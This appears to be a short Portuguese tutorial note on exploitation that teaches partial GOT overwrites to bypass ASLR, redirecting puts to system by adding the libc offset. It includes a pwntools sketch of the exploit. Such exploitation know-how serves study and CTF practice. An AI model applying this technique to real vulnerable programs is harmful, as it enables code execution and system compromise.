# Corromper GOT
Voce provavelmente ja conhece essa técnica, visto que eu usei ela em ROP!

Mas resumindo, a GOT armazena o endereço das funções, se voce corromper um item da GOT, quando o programa-lo, vai redirecionar para a função que voce escolheu.

Porem no contexto de ASLR, nao podemos so botar o endereço de system, pq ne.... ASLR!!!

Então, nos podemos fazer um overwrite parcial!

Dependendo da arquitetura e sistema operacional isso pode variar, porem:
```py
   7f ff ff    xx xx xx   12 34 
|  Prefixo  | Parte com |  Nosso |
| SEM ASLR  |    ASLR   |  ALVO  |
```

Assim, se corrompermos so os `LSB`s, podemos ignorar a parte do ASLR...

```py
puts:    7f ff ff   xx xx xx   10 00 -| offset constante
system:  7f ff ff   xx xx xx   12 34 -| entre elas 0x234

puts:    7f ff ff   11 3c 4c   10 00 -| 0x234
system:  7f ff ff   11 3c 4c   12 34 -|

puts:    7f ff ff   4c 1d 42   10 00 -| 0x234
system:  7f ff ff   4c 1d 42   12 34 -|
```
Assim, se adicionarmos ao `puts` o offset entre ele e `system`... Usando por exemplo, um gadget 
`add [rbx] al`

Isso também pode ser usado no valor armazenado para o `ret` em BoFs tradicionais! Caso a função 
tenha sido chamada pelo libc! 

**Obs:** Dependendo da vuln, voce usa tipos de offsets diferentes
- Write -> offset = System - Base_Libc
- Add   -> offset = System - puts # Ou qualquer outra função

# Exemplo
Vamos supor que temos um `add-what-where` -> Ex: `add [rbx] al;ret;`
```py
elf = ELF("vuln123")
libc = elf.libc

got = elf.got.puts # Endereço de Puts na got
got += 7 # Queremos alterar somente os bytes 7 e 8
         # Lembrando que isso depende, em alguma outra
         # Pode ser 6 7 8, etc etc....

offset = libc.sym.system - libc.sym.puts

payload = vuln_add(got, offset)
payload += elf.plt.puts # Chamar Puts por meio da plt

io.interactive()
```
